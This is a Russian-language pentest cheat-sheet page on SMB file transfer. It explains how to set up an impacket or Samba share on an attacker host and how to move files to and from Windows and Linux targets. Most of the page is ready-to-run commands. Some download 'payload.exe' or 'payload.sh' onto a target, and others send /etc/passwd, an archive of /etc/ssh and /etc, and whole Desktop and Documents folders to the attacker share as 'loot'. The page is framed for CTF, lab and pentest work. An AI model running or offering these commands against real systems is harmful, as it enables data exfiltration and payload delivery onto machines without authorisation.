# 03 - SMB

> [← README](../../README_RU.md) · [Следующий раздел →](04-webdav.md)

Двусторонний обмен (download + upload) через SMB-шару, поднятую на атакующем. Отлично заходит в доменных сетях, где SMB (445) ходит свободно. Одна шара закрывает сразу оба направления: цель может и забрать файл, и залить свой.

> **Вынесено в другие файлы:** WebDAV - [04-webdav.md](04-webdav.md), FTP - [05-ftp.md](05-ftp.md), SCP/SFTP - [06-scp-sftp-rsync.md](06-scp-sftp-rsync.md).

---

## Навигация

|  |  |
|---|---|
| [1.💻Attacker - поднять SMB-шару (LHOST)](#1attacker---поднять-smb-шару-lhost) | [2.🪟Windows target ↔ Attacker (всё на RHOST)](#2windows-target--attacker-всё-на-rhost) |
| [3.🐧Linux target ↔ Attacker (всё на RHOST)](#3linux-target--attacker-всё-на-rhost) | [4. Диагностика](#4-диагностика) |

---

## 1.💻Attacker - поднять SMB-шару (LHOST)

### Установка impacket

**Через pipx (рекомендуется):**
```bash
pipx install impacket
```

**Через pip:**
```bash
pip install impacket
```

### Запуск шары

**Перейти в каталог, который станет содержимым шары:**
```bash
cd /tmp/share
```

**Основной вариант - с аутентификацией (используется почти всегда; нужен для Win10+/доменных хостов, где аноним-SMB запрещён):**
```bash
sudo impacket-smbserver share $(pwd) -smb2support -username test -password test
```

**Анонимная шара (только CTF/лаб, где аноним разрешён):**
```bash
sudo impacket-smbserver share $(pwd) -smb2support
```

**С аутентификацией и явным путём (без предварительного `cd`):**
```bash
sudo impacket-smbserver share /tmp/share -smb2support -username test -password test
```

**Только для чтения (цель не сможет ничего записать):**
```bash
sudo impacket-smbserver share $(pwd) -smb2support -username test -password test -readonly
```

**Привязать к конкретному IP LHOST:**
```bash
sudo impacket-smbserver share $(pwd) -smb2support -username test -password test -ip $LHOST
```

**Открыть порт 445 в фаерволе LHOST:**
```bash
sudo ufw allow 445/tcp
```

**Если 445 уже занят (например, локальной Samba):**
```bash
sudo systemctl stop smbd
```

> **Важно:** имя шары здесь - `share`, цель видит её как `\\LHOST\share\`. Всё, что лежит в каталоге шары (`/tmp/share`), доступно цели; всё, что цель зальёт, окажется там же.
>
> `sudo` нужен потому, что порт **445 < 1024** (привилегированный). Если запускаем не от root - можно выдать право бинарь-капабилити: `sudo setcap 'cap_net_bind_service=+ep' $(which python3)`.

### Samba - если impacket недоступен
Может помочь если impacket даёт I/O error при kernel mount
**Установить:**
```bash
sudo apt install -y samba
```

**Настройка:**
```bash
sudo cp /etc/samba/smb.conf /etc/samba/smb.conf.bak
sudo mkdir -p /samba/private
sudo groupadd smbgrp
sudo useradd user1
sudo usermod -aG smbgrp user1
sudo smbpasswd -a user1
```


**Добавить шару в `/etc/samba/smb.conf`:**
```ini
[private]
path = /samba/private
comment = Private - full access
browsable = yes
guest ok = no
valid users = @smbgrp
read only = no
writable = yes
```

**Настроить права**
```bash
sudo chown -R user1:smbgrp /samba/private
sudo chmod 770 /samba/private
```

**Перезапустить smbd:**
```bash
sudo systemctl restart smbd
```

---

## 2.🪟Windows target ↔ Attacker (всё на RHOST)

### Быстрый доступ

**GUI - «Мой компьютер» → вставить путь:**
```text
\\LHOST\share\
```

**Браузер - адресная строка:**
```text
file://///LHOST/share
```

### Download (цель получает файл)

**CMD - без аутентификации:**
```cmd
copy \\%LHOST%\share\payload.exe C:\Users\%USERNAME%\Downloads\
```

**CMD - с аутентификацией: сначала `net use`:**
```cmd
net use \\%LHOST%\share /user:test test
```

**CMD - затем копируем:**
```cmd
copy \\%LHOST%\share\payload.exe C:\Users\%USERNAME%\Downloads\
```

**CMD - примонтировать как диск и скопировать:**
```cmd
net use Z: \\%LHOST%\share /user:test test
```

```cmd
copy Z:\payload.exe C:\Users\Public\
```

**robocopy - устойчивее `copy`, умеет папки и повторы:**
```cmd
robocopy \\%LHOST%\share C:\Temp payload.exe
```
**PowerShell New-SmbMapping**
```powershell
New-SmbMapping -RemotePath "\\$LHOST\share" -UserName "test" -Password "test" | Out-Null; Copy-Item "\\$LHOST\share\from-kali.txt" "C:\Users\$env:USERNAME\Downloads\" -Force; Remove-SmbMapping -RemotePath "\\$LHOST\share" -Force
```



**PowerShell - Copy-Item:**
```powershell
Copy-Item -Path "\\$LHOST\share\flag.txt" -Destination "C:\Users\$env:USERNAME\Downloads\"
```

**PowerShell из CMD:**
```cmd
powershell -c "Copy-Item -Path '\\%LHOST%\share\payload.exe' -Destination 'C:\Users\%USERNAME%\Downloads\'"
```

### Upload (цель отправляет файл)

**CMD - с аутентификацией сначала `net use`:**
```cmd
net use \\%LHOST%\share /user:test test
```

**CMD - один файл:**
```cmd
copy C:\Users\Public\secrets.txt \\%LHOST%\share\
```

**CMD - несколько файлов (xcopy сохраняет структуру):**
```cmd
xcopy C:\Users\%USERNAME%\Downloads\* \\%LHOST%\share\%COMPUTERNAME%_Downloads\ /E /I
```

**CMD - весь рабочий стол:**
```cmd
xcopy %USERPROFILE%\Desktop\* \\%LHOST%\share\%COMPUTERNAME%_Desktop\ /E /I
```

**CMD - все Документы:**
```cmd
xcopy %USERPROFILE%\Documents\* \\%LHOST%\share\%COMPUTERNAME%_Documents\ /E /I
```

**robocopy - целые папки (быстрее и надёжнее xcopy):**
```cmd
robocopy C:\Users\Public\secrets \\%LHOST%\share\loot /E
```
**Powershell - NewSMbMapping**
```powershell
New-SmbMapping -RemotePath "\\$LHOST\share" -UserName "test" -Password "test" | Out-Null; Copy-Item "C:\Users\Public\secrets.zip" "\\$LHOST\share\" -Force; Remove-SmbMapping -RemotePath "\\$LHOST\share" -Force
```

**PowerShell - Copy-Item:**
```powershell
Copy-Item -Path "C:\Users\Public\secrets.txt" -Destination "\\$LHOST\share\"
```

**PowerShell из CMD:**
```cmd
powershell -c "Copy-Item -Path 'C:\Users\Public\secrets.txt' -Destination '\\%LHOST%\share\'"
```

**Убрать примонтированный диск / все подключения:**
```cmd
net use Z: /delete
```

```cmd
net use * /delete /y
```

---

## 3.🐧Linux target ↔ Attacker (всё на RHOST)

### Установка

**smbclient + cifs-utils (в Kali уже есть):**
```bash
sudo apt install -y smbclient cifs-utils
```

### Посмотреть доступные шары

**Список шар без пароля:**
```bash
smbclient -L //$LHOST -N
```

**С логином/паролем:**
```bash
smbclient -L //$LHOST -U test%test
```

### Download (цель получает файл)

**smbclient `-N` - разовое скачивание без монтирования (аноним):**
```bash
smbclient //$LHOST/share -N -c "get payload.exe"
```

**smbclient `-U` - то же с логином/паролем:**
```bash
smbclient //$LHOST/share -U test%test -c "get payload.exe"
```

**Несколько файлов по маске (`mget`):**
```bash
smbclient //$LHOST/share -N -c "prompt OFF; mget *.txt"
```

**Рекурсивно забрать всё содержимое шары:**
```bash
smbclient //$LHOST/share -N -c "recurse ON; prompt OFF; mget *"
```

**mount cifs - работать с шарой как с обычной папкой:**
Из-за ошибок impacket - когда на хосте нет smbclient.
Мы можем примонтировать нашу шару, для этого нужен samba на хосте LHOST

LHOST(SAMBA SERVER)
```bash
sudo cp ~/file-transfer/payload.sh /samba/private/
```

RHOST FULL CHAIN:
```
#Make dir
sudo mkdir /mnt/mountpoint/
#Mount share
sudo mount -t cifs //10.0.2.10/private /mnt/mountpoint -o username=user1,password=1337,vers=2.0,sec=ntlmssp,nounix

#List files in attacker share
sudo ls /mnt/mountpoint/
#Copy payload to target pc
sudo cp /mnt/mountpoint/payload.sh .

#Final - umount share and del directiory mountpoint.
sudo umount /mnt/mountpoint
sudo rmdir /mnt/mountpoint
```

> Если `mount.cifs` возвращает `error(5): Input/output error` на impacket, нужны опции SMB2 `vers=2.0,sec=ntlmssp,nounix`. Если всё равно не работает, используйте `smbclient get/put`.

### Upload (цель отправляет файл)

**smbclient `-N put` - разовая заливка без монтирования (аноним):**
```bash
smbclient //$LHOST/share -N -c "put /etc/passwd passwd.txt"
```

**smbclient `-U put` - то же с логином/паролем:**
```bash
smbclient //$LHOST/share -U test%test -c "put /etc/passwd passwd.txt"
```

**Несколько файлов по маске (`mput`):**
```bash
smbclient //$LHOST/share -N -c "prompt OFF; mput *.txt"
```

**Рекурсивно залить каталог tar archive:**
```bash
tar czf - /etc/ssh | smbclient //$LHOST/share -U test%test -c "put - ssh-backup.tar.gz"
```

**Создать подпапку на шаре и залить туда:**
```bash
smbclient //$LHOST/share -N -c "mkdir loot; cd loot; prompt OFF; mput *.zip"
```

**mount cifs - работать с шарой как с обычной папкой:**
Из-за ошибок impacket - когда на хосте нет smbclient.
Мы можем примонтировать нашу шару, для этого нужен samba на хосте LHOST


RHOST FULL CHAIN:
```
#Make dir
sudo mkdir /mnt/mountpoint/
#Mount share
sudo mount -t cifs //$LHOST/private /mnt/mountpoint -o username=user1,password=1337,vers=2.0,sec=ntlmssp,nounix

#List files in attacker share
sudo ls /mnt/mountpoint/

#Copy to ATTACKER SHARE
sudo cp /etc/passwd /mnt/mountpoint/
#Copy Directory (tar)
sudo tar czf /mnt/mountpoint/etc-backup.tar.gz /etc

#Final - umount share and del directiory mountpoint.
sudo umount /mnt/mountpoint
sudo rmdir /mnt/mountpoint
```

LHOST:
```bash
#GET LOOT
sudo ls -la /samba/private
```

---

## 4. Диагностика

**Порт 445 открыт и отвечает:**
```bash
nc -zv $LHOST 445
```

**Список шар (Linux):**
```bash
smbclient -L //$LHOST -N
```

**Список шар (Windows CMD):**
```cmd
net view \\%LHOST%
```

**Проверить, что видит цель по UNC-пути (Windows):**
```cmd
dir \\%LHOST%\share
```

> **Частые грабли:**
>
> - **Порт 445 < 1024** - сервер запускаем через `sudo` (либо выдаём капабилити `setcap 'cap_net_bind_service=+ep' $(which python3)`).
> - **445 занят** (чаще всего локальной Samba) - `impacket-smbserver` не стартует: `sudo systemctl stop smbd` либо слушаем на другом порту (`-port 4455`, но учитываем, что Windows UNC-путь порт не принимает - нужен проброс/туннель).
> - **Фаервол на LHOST** может не пускать входящий 445: `sudo ufw allow 445/tcp`.
> - **Анонимный SMB** на Windows 10/11 и Server выключен по умолчанию - поднимай шару с `-username/-password`. Мало того, и на **клиенте** должна быть разрешена политика «Включить небезопасные гостевые входы» (`AllowInsecureGuestAuth` в реестре / Групповые политики), иначе аноним не сработает даже при открытом сервере.
> - **`-smb2support` обязателен** для Win10+: без него SMB2/3-клиент не подключится.
> - **SMB signing**: если цель/политика требует подпись, impacket-шара может не подойти - тогда поднимай Samba с корректным `smb.conf`.
> - **Ошибки `net use`**: `1326` - неверные учётки; `1272` - нет доступа / заблокировано политикой; `53` или `67` - путь/сеть не найдены (фаервол, маршрут, резолв имени).

---

**См. также:** [01 - Attacker → Target](01-attacker-to-target.md) · [02 - Target → Attacker](02-target-to-attacker.md) · [04 - WebDAV](04-webdav.md) · [05 - FTP](05-ftp.md) · [06 - SCP/SFTP](06-scp-sftp-rsync.md)

---

## Формы переменных

**Linux (bash)**
```bash
export LHOST=192.168.2.5
export RHOST=192.168.10.20
# использование: $LHOST
```

**Windows (CMD)**
```cmd
set LHOST=192.168.2.5
set RHOST=192.168.10.20
:: использование: %LHOST%
```

**Windows (PowerShell)**
```powershell
$LHOST = "192.168.2.5"
$RHOST = "192.168.10.20"
# использование: $LHOST
```

Подробнее - [README](../../README_RU.md#обозначения-и-переменные).

---

[← Назад к справочнику](../../README_RU.md)
